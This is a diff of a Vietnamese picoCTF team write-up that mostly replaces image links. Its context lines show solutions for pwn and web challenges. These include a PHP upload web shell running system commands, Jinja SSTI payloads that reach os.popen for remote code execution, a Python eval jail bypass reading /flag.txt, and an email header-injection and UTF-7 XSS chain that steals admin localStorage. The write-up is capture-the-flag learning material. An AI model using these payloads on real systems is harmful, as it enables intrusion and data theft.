@@ -17,11 +17,11 @@ authors:
 
 Giải picoCTF vừa rồi team mình đã hardcore và giải được gần hết trừ 3 bài siêu khó vip pro. Sau đây là writeup các bài mà mình làm được trong giải và 1 bài mình làm lại sau giải.
 
-![image](https://hackmd.io/_uploads/BkcgoK5hkl.png)
+![image](./images/image0.png)
 
 ## pwn/PIE TIME
 
-![image](https://hackmd.io/_uploads/ryqH_qq2kl.png)
+![image](./images/image1.png)
 
 ### Hints
 
@@ -85,11 +85,11 @@ int main() {
 
 Thì cơ bản là chương trình cho ta địa chỉ hàm main và yêu cầu ta tìm địa chỉ hàm win để nhảy vào. Ở đây mình check địa chỉ hàm main là 0x133d và hàm win là 0x12a7 
 
-![image](https://hackmd.io/_uploads/Hy3Yt9c21e.png)
+![image](./images/image2.png)
 
 Từ đó mình tính được khoảng cách hai hàm như sau 0x133d - 0x12a7 = 0x96. Vậy lúc này chỉ cần trừ địa chỉ hàm main được cho với 0x96 là xong 
 
-![image](https://hackmd.io/_uploads/rJM7o55hkg.png)
+![image](./images/image3.png)
 
 Từ đó mình xây dựng solve script sau 
 
@@ -106,14 +106,14 @@ p.sendline(hex(win))
 print(p.recvall().decode())
 ```
 
-![image](https://hackmd.io/_uploads/B1xknc9nJg.png)
+![image](./images/image4.png)
 
 `Flag: picoCTF{b4s1c_p051t10n_1nd3p3nd3nc3_80c3b8b7}
 `
 
 ## web/Cookie Monster Secret Recipe
 
-![image](https://hackmd.io/_uploads/rkec6PKj1l.png)
+![image](./images/image5.png)
 
 ### Hints
 
@@ -123,25 +123,25 @@ Cookie
 
 Challenge cho mình một trang web như sau yêu cầu đăng nhập
 
-![image](https://hackmd.io/_uploads/BJh3awKj1l.png)
+![image](./images/image6.png)
 
 Sau khi đăng nhập thì hiện trang sau
 
-![image](https://hackmd.io/_uploads/SyFaTDYoJx.png)
+![image](./images/image7.png)
 
 Vì bài này đề cập đến cookie nên mình mở devtool và thấy một đoạn base64 
 
-![image](https://hackmd.io/_uploads/ryEeCvKs1e.png)
+![image](./images/image8.png)
 
 Thử decode và mình có flag
 
-![image](https://hackmd.io/_uploads/rkOM0Ptsyl.png)
+![image](./images/image9.png)
 
 `Flag: picoCTF{c00k1e_m0nster_l0ves_c00kies_E634DFBB} `
 
 ## web/head-dump
 
-![image](https://hackmd.io/_uploads/ryQ_1_YoJe.png)
+![image](./images/image10.png)
 
 ### Hints
 
@@ -151,25 +151,25 @@ No hint
 
 Chall cho mình một trang web
 
-![image](https://hackmd.io/_uploads/SyBT1OFiye.png)
+![image](./images/image11.png)
 
 Thấy không có gì khả nghi cả nên mình thử dirsearch xem có gì hot
 
-![image](https://hackmd.io/_uploads/rJBhguKiJe.png)
+![image](./images/image12.png)
 
 Hmmm có một endpoint /headdump trông khá sú khi vào thì web download xuống một file
 
-![image](https://hackmd.io/_uploads/ryBZ-_FiJe.png)
+![image](./images/image13.png)
 
 mở lên và có luôn flag
 
-![image](https://hackmd.io/_uploads/HJegZuti1g.png)
+![image](./images/image14.png)
 
 `Flag: picoCTF{Pat!3nt_15_Th3_K3y_f1179e46}`
 
 ## web/n0s4n1ty 1
 
-![image](https://hackmd.io/_uploads/BJJK-_KsJx.png)
+![image](./images/image15.png)
 
 ### Hints
 
@@ -179,7 +179,7 @@ File upload vulnerability
 
 Challenge cho mình một trang web về profile 
 
-![image](https://hackmd.io/_uploads/BJFsZOKiJl.png)
+![image](./images/image16.png)
 
 Vì web cho upload cả file php nên mình thử payload sau
 
@@ -187,13 +187,13 @@ Vì web cho upload cả file php nên mình thử payload sau
 
 Và đoạn code được thực thi
 
-![image](https://hackmd.io/_uploads/BJbvfdKoyl.png)
+![image](./images/image17.png)
 
 Mình thử `ls` nhưng không có file gì lạ nên thử `ls /` và thấy có `/challenge` khá sú
 
 ```<?php system("ls -lah /");?>```
 
-![image](https://hackmd.io/_uploads/HJe7XOKjyx.png)
+![image](./images/image18.png)
 
 Thử ls thư mục này và có 2 file 
 
@@ -203,13 +203,13 @@ Thử ls thư mục này và có 2 file
 
 ```<?php system("sudo cat /challenge/metadata.json")?>```
 
-![image](https://hackmd.io/_uploads/rkHMEuYsyg.png)
+![image](./images/image19.png)
 
 `Flag: picoCTF{wh47_c4n_u_d0_wPHP_4043cda3}`
 
 ## web/SSTI1
 
-![image](https://hackmd.io/_uploads/HJmiE_FiJl.png)
+![image](./images/image20.png)
 
 ### Hints
 
@@ -219,11 +219,11 @@ SSTI
 
 Okay thì đây là một bài SSTI cơ bản
 
-![image](https://hackmd.io/_uploads/B1ea4uKjye.png)
+![image](./images/image21.png)
 
 Mình tìm payload trên đây https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md 
 
-![image](https://hackmd.io/_uploads/HJRdU_Fiye.png)
+![image](./images/image22.png)
 
 ```python
 {{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
@@ -231,7 +231,7 @@ Mình tìm payload trên đây https://github.com/swisskyrepo/PayloadsAllTheThin
 
 Sử dụng và mình đã thành công RCE
 
-![image](https://hackmd.io/_uploads/HklTi8OKsJe.png)
+![image](./images/image23.png)
 
 thử list các file
 
@@ -239,7 +239,7 @@ thử list các file
 {{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('ls')|attr('read')()}}
 ```
 
-![image](https://hackmd.io/_uploads/rkg0UdFoyx.png)
+![image](./images/image24.png)
 
 Thấy có file flag và chỉ cần đọc thôi 
 
@@ -247,13 +247,13 @@ Thấy có file flag và chỉ cần đọc thôi
 {{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat flag')|attr('read')()}}
 ```
 
-![image](https://hackmd.io/_uploads/ryhyw_KiJl.png)
+![image](./images/image25.png)
 
 `Flag: picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_3066c7bd}`
 
 ## web/SSTI2
 
-![image](https://hackmd.io/_uploads/B1VS8utjke.png)
+![image](./images/image26.png)
 
 ### Hints
 
@@ -263,17 +263,17 @@ SSTI
 
 Bài này giống bài trước nhưng có filter dấu `_`
 
-![image](https://hackmd.io/_uploads/SJvkIOFiyl.png)
+![image](./images/image27.png)
 
 Okey thì payload trước đã có thể bypass rồi nên mình xài lại thôi 
 
-![image](https://hackmd.io/_uploads/ryMEUOtiyx.png)
+![image](./images/image28.png)
 
 `Flag: picoCTF{sst1_f1lt3r_byp4ss_e3f3b57a}`
 
 ## web/3v@l
 
-![image](https://hackmd.io/_uploads/rybAP_Fs1e.png)
+![image](./images/image29.png)
 
 ### Hints
 
@@ -283,11 +283,11 @@ Pyjail
 
 Challenge cho mình một trang web để tính toán 
 
-![image](https://hackmd.io/_uploads/SkMMOdKj1l.png)
+![image](./images/image30.png)
 
 Ở đây web cấm gần hết các chữ dùng để eval lệnh python rồi 
 
-![image](https://hackmd.io/_uploads/S1-BOuto1x.png)
+![image](./images/image31.png)
 
 ```html
 <!--
@@ -307,7 +307,7 @@ open(chr(47)+"flag"+chr(46)+"txt")
 
 Ok và mình đã thực hiện eval thành công nhưng chỉ in ra được object của open thôi 
 
-![image](https://hackmd.io/_uploads/SyOxYOYsyl.png)
+![image](./images/image32.png)
 
 Để in ra giá trị thì mình có thể trigger một cái error bằng cách ép kiểu int cho flag và vì flag chỉ là một string nên nó sẽ lỗi
 
@@ -317,13 +317,13 @@ int(*open(chr(47)+"flag"+chr(46)+"txt"))
 
 Và từ đó mình có flag 
 
-![image](https://hackmd.io/_uploads/HJoNFOYoyx.png)
+![image](./images/image33.png)
 
 `Flag: picoCTF{D0nt_Use_Unsecure_f@nctions6798a2d8}`
 
 ## web/WebSockFish
 
-![image](https://hackmd.io/_uploads/BJy7j0521g.png)
+![image](./images/image34.png)
 
 ### Hints
 
@@ -333,21 +333,21 @@ Websocket
 
 Challenge cho mình một trang web đánh cờ 
 
-![image](https://hackmd.io/_uploads/rJRoI553kg.png)
+![image](./images/image35.png)
 
 Sau khi đánh được một bước thì mình thấy web sử dụng websocket để giao tiếp 
 
-![image](https://hackmd.io/_uploads/BymRUc92kx.png)
+![image](./images/image36.png)
 
 Mình thử buff lên và có luôn flag ... 
 
-![image](https://hackmd.io/_uploads/SkXZwqc3yx.png)
+![image](./images/image37.png)
 
 `Flag: picoCTF{c1i3nt_s1d3_w3b_s0ck3t5_0d3d41e1}`
 
 ## web/Apriti sesamo
 
-![image](https://hackmd.io/_uploads/SJTaKOFikg.png)
+![image](./images/image38.png)
 
 ### Hints
 
@@ -357,13 +357,13 @@ Type Juggling
 
 Challenge cho mình một web như sau 
 
-![image](https://hackmd.io/_uploads/r1V8cdYj1x.png)
+![image](./images/image39.png)
 
-![image](https://hackmd.io/_uploads/S1aU5uFjyl.png)
+![image](./images/image40.png)
 
 Sử dụng ~ để xem backup của file và mình thấy có một đoạn php đã được obfuscate 
 
-![image](https://hackmd.io/_uploads/ByJdcuYokx.png)
+![image](./images/image41.png)
 
 ```php
 <!--?php
@@ -379,13 +379,13 @@ if(isset($_POST["username"])&& isset($_POST["pwd"])){$yuf85e0677=$_POST["usernam
 
 Dạng này mình từng làm rồi, ở đây chỉ cần truyền vào 2 array để sha1 trả ra null và sẽ giống nhau từ đó mình có flag 
 
-![image](https://hackmd.io/_uploads/BJ2hcutj1e.png)
+![image](./images/image42.png)
 
 ```picoCTF{w3Ll_d3sErV3d_Ch4mp_233d4a80}```
 
 ## web/Pachinko
 
-![image](https://hackmd.io/_uploads/Syzj5R93kx.png)
+![image](./images/image43.png)
 
 ### Hints
 
@@ -395,14 +395,14 @@ No hint
 
 Bài này có 2 flag một là random nên mình bấm vào cái ra flag luôn, hai là về pwn và wasm nên mình thua
 
-<!-- ![image](https://hackmd.io/_uploads/ryyoKOtjJx.png) -->
+<!-- ![image](./images/image44.png) -->
 
-![image](https://hackmd.io/_uploads/ryq_GoU2yx.png)
+![image](./images/image45.png)
 
 
 ## web/secure-email-service
 
-![image](https://hackmd.io/_uploads/Byig4y1T1g.png)
+![image](./images/image46.png)
 
 ### Hints
 
@@ -598,27 +598,27 @@ asyncio.run(bot())
 
 Ok thì challenge cho mình một trang web sau, mục tiêu của ta là lấy flag ở localStorage của admin_bot
 
-![image](https://hackmd.io/_uploads/SJf49BA2yx.png)
+![image](./images/image47.png)
 
 Theo như hướng dẫn thì ta có thể lấy mật khẩu của `user@ses` tại `/api/password` 
 
-![image](https://hackmd.io/_uploads/B1OB9r0nyl.png)
+![image](./images/image48.png)
 
 Log in vào và mình có một trang web gửi mail như sau 
 
-![image](https://hackmd.io/_uploads/BkYwqB031g.png)
+![image](./images/image49.png)
 
 Ok thì mình có một mail của admin gửi và khi mở lên thì mình nhận ra đây là phần jinja có trong source nên mình nghĩ là mình có thể gửi html và trigger XSS 
 
-![image](https://hackmd.io/_uploads/SJwq5B0hJl.png)
+![image](./images/image50.png)
 
 Nhưng không, các mail khi được gửi đã bị parse và ta không thể truyền vào như thông thường.
 
-![image](https://hackmd.io/_uploads/Bkg9a9B031e.png)
+![image](./images/image51.png)
 
 Nhưng tại sao phần email của admin lại hiện như một html ? Ở đây khi ta quan sát kỹ email thì nó sẽ có một header Content-Type như sau 
 
-![image](https://hackmd.io/_uploads/HyR7orC2Jx.png)
+![image](./images/image52.png)
 
 Ok nói rõ hơn thì format của một email sẽ trông giống một HTTP request và có sử dụng Content-Type và charset. Trong đây thì các mail được phân bởi một boundary.
 
@@ -640,7 +640,7 @@ Content-Transfer-Encoding: 7bit
 
 Sở dĩ mail của admin có dạng html vì có Content-Type như sau. Từ đó ta sẽ tìm cách thêm vào một section trong email có Content-Type này để trigger biến content thành html và thực hiện lệnh js. 
 
-![image](https://hackmd.io/_uploads/Hy8t3rCnJl.png)
+![image](./images/image53.png)
 
 Ở đây ta đọc kỹ đoạn send email
 
@@ -715,25 +715,25 @@ From: test@ses
 
 và ta có thể thay đổi header From nhưng ...
 
-![image](https://hackmd.io/_uploads/rylGfRSC2Jl.png)
+![image](./images/image54.png)
 
 Ok thì nó trả ra lỗi ở đây mình check thì hàm email khi parse đã phát hiện mình đã inject vào một header lạ.
 
-![image](https://hackmd.io/_uploads/ByavCrC3ke.png)
+![image](./images/image55.png)
 
 Ok sau một hồi research thì mình phát hiện cơ chế nó ở đây https://github.com/python/cpython/blob/main/Lib/email/header.py#L384
 
 Thì nó sẽ check subject của mình theo một regex sau có nghĩa là phát hiện xuống dòng theo sau là các char khác khoảng trắng và dấu hai chấm.
 
-![image](https://hackmd.io/_uploads/rJPbJU0nkg.png)
+![image](./images/image56.png)
 
 Để bypass thì trước hai chấm mình sẽ thêm một khoảng trắng là được. Từ đó regex sẽ không tìm được pattern và ta sẽ bypass được.
 
-![image](https://hackmd.io/_uploads/rJDGkI0nkx.png)
+![image](./images/image57.png)
 
 Tiến hành gửi lại và yeah nó đã bypass được
 
-![image](https://hackmd.io/_uploads/SyZKyUR2kl.png)
+![image](./images/image58.png)
 
 Khi check thì mình thấy được admin đã nhận được email từ test@ses là phần From mà mình đã inject 
 
@@ -755,7 +755,7 @@ def _make_boundary(cls, text=None):
 
 Ban đầu thì mình định sử dụng randcrack https://github.com/tna0y/Python-random-module-cracker nhưng khi xem lại thì nó sử dụng random để gen ra 63 bit trong khi randcrack chỉ chấp nhận submit 32 bit 
 
-![image](https://hackmd.io/_uploads/Bk9OeU0nJl.png)
+![image](./images/image59.png)
 
 Ở đây chúng ta có thể crack số 64 bit nhờ vào một tính chất như sau https://ctftime.org/writeup/14939#:~:text=getrandbits(64)%20you%20actually%20get%20getrandbits(32)%20%3C%3C%2032%20%7C%20getrandbits(32)
 
@@ -814,13 +814,13 @@ for _ in tqdm.trange(10):
 
 Khi chạy thì mình có thể predict các số 63 bit tiếp theo của random và cũng là boundary của các email tiếp theo 
 
-![image](https://hackmd.io/_uploads/rJAzrLChyx.png)
+![image](./images/image60.png)
 
 #### Using Base64 encoding to encode newline character
 
 Ok chúng ta đã crack được boundary nhưng còn một vấn đề là về signature. Làm sao để tận dụng được boundary để sử dụng private key? Khi admin reply thì mình nhận ra nó sẽ lấy subject của tin nhắn trước như sau 
 
-![image](https://hackmd.io/_uploads/BykrFKCnyl.png)
+![image](./images/image61.png)
 
 Từ đó mình có thể sử dụng boundary của email tiếp theo để khi reply admin sẽ tiến hành signature cái subject mà mình chèn vào từ email trước nhưng mà làm thế nào ?
 
@@ -832,11 +832,11 @@ Ok thì mình có thê truyền một subject như sau
 
 Và yeah endline đã được vào subject 
 
-![image](https://hackmd.io/_uploads/H1A3LDC3yl.png)
+![image](./images/image62.png)
 
 Và khi mình reply nó sẽ lấy header From để gửi. Từ đây mình có luồng attack như sau : đăng nhập => crack boundary => lấy boundary của email tiếp theo => gửi payload đã được base64 và inject header From từ admin@ses => khi admin reply chính mình thì payload đã được parse ra và kèm với chữ ký => XSS 
 
-![image](https://hackmd.io/_uploads/Skx0IvCnkg.png)
+![image](./images/image63.png)
 
 #### Bypass XSS by using charset utf-7 charset
 
@@ -855,7 +855,7 @@ MIME-Version : 1.0
 
 Sau khi check thì dầu < và > của mình đã bị parse và mình không thể chèn 
 
-![image](https://hackmd.io/_uploads/Bk8cRKRhkx.png)
+![image](./images/image64.png)
 
 Đến đây mình có thể tận dụng charset để bypass cụ thể mình sẽ sử dụng utf-7 khi đó dấu < và > sẽ được biến đổi thành +ADw và -+AD `https://gchq.github.io/CyberChef/#recipe=Encode_text('UTF-7%20(65000)')&input=PGltZyBzcmM9IngiIG9uZXJyb3I9YWxlcnQoMSk7IC8%2B`
 
@@ -872,11 +872,11 @@ MIME-Version : 1.0
 
 Ok payload đã được gửi nhưng vẫn không có gì xảy ra
 
-![image](https://hackmd.io/_uploads/ByjZec031x.png)
+![image](./images/image65.png)
 
  và mình phát hiện có một phần khá sú 
 
-![image](https://hackmd.io/_uploads/H1NGlcRnke.png)
+![image](./images/image66.png)
 
 Số .0 này là một cơ chế để ngăn chặn việc thêm boundary một cách vô ý https://github.com/python/cpython/blob/main/Lib/email/generator.py#L384
 
@@ -901,7 +901,7 @@ MIME-Version : 1.0
 
 And yeah regex sẽ không tìm được và mình đã XSS thành công 
 
-![image](https://hackmd.io/_uploads/rk59g9AhJg.png)
+![image](./images/image67.png)
 
 #### Final attack 
 
@@ -926,11 +926,11 @@ MIME-Version : 1.0
 
 And well, nó bị lỗi
 
-![image](https://hackmd.io/_uploads/HkecmqChkl.png)
+![image](./images/image68.png)
 
 check log thì mình phát hiện là trong khi parse code đã detect được embedded header 
 
-![image](https://hackmd.io/_uploads/H1wrvpRnJg.png)
+![image](./images/image69.png)
 
 Đó là do trong https:// đã vi phạm regex ở phần trên nên mình tiến hành bypass bằng cách bỏ đi https: 
 
@@ -940,14 +940,14 @@ check log thì mình phát hiện là trong khi parse code đã detect được 
 
 And yeah finally mình cũng lấy được localStorage 
 
-![image](https://hackmd.io/_uploads/B1DAj6Ahyg.png)
+![image](./images/image70.png)
 
 Bây giờ chỉ cần gửi payload cho admin rồi trigger 2 lần một lần để reply chứa chữ ký, một lần để vào và dính XSS là xong 
 
-![image](https://hackmd.io/_uploads/SJjv260h1l.png)
+![image](./images/image71.png)
 
 Cuối cùng ta có flag 
 
-![image](https://hackmd.io/_uploads/SkXPn60nJl.png)
+![image](./images/image72.png)
 
 
